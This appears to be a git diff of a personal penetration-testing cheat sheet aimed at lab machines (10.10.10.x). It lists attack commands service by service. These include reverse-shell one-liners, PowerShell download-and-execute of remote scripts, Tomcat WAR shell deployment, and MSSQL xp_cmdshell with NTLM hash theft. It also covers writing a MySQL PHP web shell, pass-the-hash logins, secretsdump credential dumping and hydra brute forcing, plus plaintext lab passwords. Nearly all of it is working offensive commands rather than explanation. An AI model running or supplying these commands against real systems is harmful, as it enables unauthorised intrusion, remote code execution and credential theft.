@@ -2,6 +2,9 @@
 #Normally I just open this with Firefox#
 ########################################
 
+#Main
+sudo rustscan --ulimit 5000 10.10.10.97 -- -A -sC -sV --script 'default,vuln' -oX scan && xsltproc scan -o scan.html && rm -rf nikto-scan
+
 #OneLiners
 bash -i >& /dev/tcp/10.0.0.1/1234 0>&1
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
@@ -30,18 +33,19 @@ stty rows ${ROWS} cols ${COLS}
 TERM=xterm
 xterm-color/xterm-256color
 
-
 #Useful Kali Directories
 ls /usr/share/webshells/webshells
 ls /usr/share/windows-binaries/privesc
 
 #File Uploading/Downloading
 powershell IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.1/webshells/Invoke-PowerShellTcp.ps1')
-wget http://10.0.0.1/
+powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.0.0.1/', '<DESTINATION_FILE>')
+powershell "wget http://10.0.0.1/"
 cscript wget.vbs http://10.0.0.1/file.exe FILEYOUNEED
 sudo smbserver.py -comment 'Transfer' smb smb
 sudo python -m SimpleHTTPServer 80
 certutil.exe -urlcache -split -f "http://10.0.0.1/privesc/Powerless.bat" Powerless.bat
+scp <SOURCE_FILE> <USER>@10.10.10.97:<DESTINATION_FILE>
 https://github.com/egre55/ultimate-file-transfer-list
 
 #Priv Esc
@@ -52,25 +56,61 @@ LinPeas.sh
 #FTP 21
 nmap --script=ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 10.10.10.97
 
+#SSH 22
+CVE-2008-0166 - https://www.exploit-db.com/exploits/5720
+
+#DNS 53
+dnsenum 10.10.10.97
+dnsrecon -d 10.10.10.97
+dnsrecon -d 10.10.10.97 -a
+dig axfr 10.10.10.97 @ns1.test.com
+
+#FINGER 79
+finger @10.10.10.97
+finger <USER>@10.10.10.97
+finger "|/bin/id@<IP>"
+finger "|/bin/ls -a /<IP>"
+
 #HTTP 80/8080/443
 feroxbuster -u http://10.10.10.97/ -x php js txt -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --extract-links
 use raft after.
 nikto -host http://10.10.10.97 -C all -o nikto-scan.html
 nikto -host http://10.10.10.97 -p 80,8080,1234 -C all -o nikto-all.html
+nikto -h 10.10.10.97 -useproxy http://10.10.10.97:4444  //squidcd
 cadaver http://10.10.10.97:8080/webdav/
-//squidcd
-nikto -h 10.10.10.97 -useproxy http://10.10.10.97:4444
 wpscan --url http://10.10.10.97/ --enumerate ap,at,tt,cb,dbe,u,m
+Drupal - Go to Modules -> (Check) PHP Filter  -> Save configuration
 git clone https://github.com/nccgroup/shocker; cd shocker; ./shocker.py -H 10.10.10.97  --command "/bin/cat /etc/passwd" -c /cgi-bin/status --verbose;  ./shocker.py -H 10.10.10.97 --command "/bin/cat /etc/passwd" -c /cgi-bin/admin.cgi --verbose
+
+#TOMCAT
+#Upload payload
+Tomcat6:
+wget 'http://<USER>:<PASSWORD>@10.10.10.97:8080/manager/deploy?war=file:shell.war&path=/shell' -O -
+Tomcat7/Above:
+curl -v -u <USER>:<PASSWORD> -T shell.war 'http://10.10.10.97:8080/manager/text/deploy?path=/shellh&update=true'
+# Execute payload
+curl http://10.10.10.97:8080/shell/
+
+#GIT
+./gitdumper.sh http://10.10.10.97/.git/ git
+./extractor.sh git git-extracted
 
 #LFI/RFI
 LoginForms - SecLists- Generic-SQLi.txt
+/usr/share/wordlist/SecLists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt
 wfuzz -u "http://10.10.10.97/file.php?command=file://FUZZ" -w lfi.list
 /opt/kadimus/kadimus -u http://10.10.10.97/LFIPAGE.php?page=
 http://10.10.10.97/index.php?page=php://filter/convert.base64-encode/resource=index
 base64 -d savefile.php
 http://10.10.10.97/page=http://192.168.1.101/maliciousfile.txt%00
 http://10.10.10.97/page=http://192.168.1.101/maliciousfile.txt?
+
+#POP3 110  (JOHN/MAIL)
+telnet 10.10.10.51 110
+USER mindy
+PASS mindy
+list
+retr 1
 
 #135 RPC
 rpcinfo -p 10.10.10.97
@@ -89,8 +129,22 @@ umount smb
 smbclient -U 'tyler%92g!mA8BGjOirkL%OG*&' //10.10.10.97/new-site -c 'put nc.exe nc.exe'
 smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' \\\\10.10.10.97\\c$
 
+#SMB SHELLS
+psexec.py <DOMAIN>/<USER>:<PASSWORD>@10.10.10.97
+wmiexec.py <DOMAIN>/<USER>:<PASSWORD>@10.10.10.97
+smbexec.py <DOMAIN>/<USER>:<PASSWORD>@10.10.10.97
+atexec.py <DOMAIN>/<USER>:<PASSWORD>@10.10.10.97 <COMMAND>
+
+#PTH Attack
+psexec.py <DOMAIN>/<USER>@10.10.10.97 -hashes :<NTHASH>
+wmiexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>
+smbexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>
+atexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>
+pth-winexe -U username/Administrator%aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 //10.10.10.97 cmd
+
 #161/162 SNMP
 snmp-check -t 10.10.10.97 -c public
+onesixtyone -c /usr/share/wordlist/SecLists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt 10.10.10.97
 
 #LDAP 389/636/3268/3269
 rpcclient -U '' -N 10.10.10.97
@@ -100,29 +154,86 @@ ldapsearch -h 10.10.10.97 -p 389 -x -b "dc=megacorp,dc=local"
 ldapsearch -h 10.10.10.97 -x -s base namingcontexts
 ldapsearch -h 10.10.10.97 -x -s sub -b "DC=megacorp,DC=local" |tee ldap.out && cat ldap.out |grep -i memberof
 
+#MSSQL 1433
+nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 10.10.10.97
+hydra -L users -P passwords 10.10.10.97 mssql -vV -I -u
+mssqlclient.py -windows-auth <DOMAIN>/<USER>:<PASSWORD>@10.10.10.97
+mssqlclient.py <USER>:<PASSWORD>@10.10.10.97
+
+# Once logged in you can run queries:
+SQL> select @@ version;
+# Steal NTLM hash
+sudo smbserver.py -smb2support smb .
+SQL> exec master..xp_dirtree '\\10.0.0.1\smb\' # Steal the NTLM hash, crack it with john or hashcat
+# Try to enable code execution
+SQL> enable_xp_cmdshell
+# Execute code
+SQL> xp_cmdshell whoami /all
+SQL> xp_cmdshell certutil.exe -urlcache -split -f http://10.0.0.1/nc.exe
+
 #Oracle 1521
 python3 odat.py all -s 10.10.10.97 -p 1521
 mv ../www/shells/x64/rev-1234.exe .
 python3 odat.py utlfile -s 10.10.10.97 -p 1521 -U scott -P tiger -d XE --sysdba --putFile c:/ rev-1234.exe rev-1234.exe
 python3 odat.py externaltable -s 10.10.10.97 -p 1521 -U scott -P tiger -d XE --sysdba --exec c:/ rev-1234.exe
 
+#NFS 2049
+showmount -e 10.10.10.97
+nmap --script=nfs-showmount 10.10.10.97
+sudo mount -v -t nfs 10.10.10.97:<SHARE> <DIRECTORY>
+sudo mount -v -t nfs -o vers=2 10.10.10.97:<SHARE> <DIRECTORY>
+
+
 #MySQL 3306
 nmap -sV -Pn -vv --script=mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 10.10.10.97 -p 3306
+hydra -L users -P passwords 10.10.10.97 mysql -vV -I -u
+mysql -u <USER>
+mysql -h 10.10.10.97 -u <USER>
+#Try to execute code
+select do_system('id');
+\! sh
+#Read & Write
+select load_file('<FILE>');
+select 1,2,"<?php echo shell_exec($_GET['c']);?>",4 into OUTFILE '<OUT_FILE>'
 
 #RDP 3389
 rdesktop -u guest -p guest 10.10.10.97 -g 94%
+rdesktop -d <DOMAIN> -u <USERNAME> -p <PASSWORD> 10.10.10.97
+xfreerdp /u:[DOMAIN\]<USERNAME> /p:<PASSWORD> /v:10.10.10.97
+xfreerdp /u:[DOMAIN\]<USERNAME> /pth:<HASH> /v:10.10.10.97
 ncrack -vv --user Username -P /usr/share/wordlists/rockyou.txt rdp://10.10.10.97
+
+#VNC 5800/58001/5900/5901
+nmap -sV --script vnc-info,realvnc-auth-bypass,vnc-title -v -p 5800,58001,5900,5901 10.10.10.97
+Linux - Default password is stored in: ~/.vnc/passwd
+Windows -
+HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\vncserver
+HKEY_CURRENT_USER\Software\TightVNC\Server
+HKEY_LOCAL_USER\Software\TigerVNC\WinVNC4
+C:\Program Files\UltraVNC\ultravnc.ini
+
+#WinRM 5985/5986
+crackmapexec winrm 10.10.10.97 -u users -p passwords
+evil-winrm -i 10.10.10.97 -u <USER> -p <PASSWORD>
+evil-winrm -i 10.10.10.97 -u <USER> -H <HASH>
+
+#CGI Specific
+ffuf -w /usr/share/wordlist/SecLists/Discovery/Web-Content/CGI-XPlatform.fuzz.txt -u http://10.10.10.97/ccgi-bin/FUZZ -t 50
+ffuf -w /usr/share/wordlist/SecLists/Discovery/Web-Content/CGIs.txt -u http://10.10.10.97/ccgi-bin/FUZZ -t 50
+ffuf -w /usr/share/wordlist/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u http://10.10.10.97/cgi-bin/FUZZ -e .sh,.pl,.cgi -t 100
 
 #ReverseShells
 cp /usr/share/windows-resources/binaries/nc.exe .
 nc.exe -e cmd 10.0.0.1 1234
 powershell IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.1/webshells/Invoke-PowerShellTcp.ps1')
 
-#PTH Attack
-pth-winexe -U username/Administrator%aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 //10.10.10.97 cmd
-
-#Enumeration
-sudo rustscan --ulimit 5000 10.10.10.97 -- -A -sC -sV --script 'default,vuln' -oX scan && xsltproc scan -o scan.html && rm -rf scan
+#Restricted Environments
+https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf
+export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
 
 #Dump
 secretsdump.py -sam sam.hive -system system.hive -security security.hive -ntds ntds.dit LOCAL
+
+#Bruteforce
+hydra -V -f -L users -P passwords ftp://10.10.10.97 -u -vV
+hydra -V -f -L users -P passwords ssh://10.10.10.97 -u -vV
